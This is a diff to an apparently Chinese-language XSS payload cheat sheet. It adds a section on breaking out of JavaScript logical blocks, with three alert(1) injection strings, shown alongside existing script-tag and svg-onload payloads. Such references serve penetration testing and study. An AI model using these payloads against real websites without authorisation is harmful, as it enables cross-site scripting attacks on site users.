@@ -54,6 +54,13 @@ javascript:alert(1)
 ```
 </script><svg onload=alert(1)>
 ```
+**8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)** <br>
+当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（if，else，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。
+```
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+```
 
 ## 致谢
 **英文议题作者：** <br>
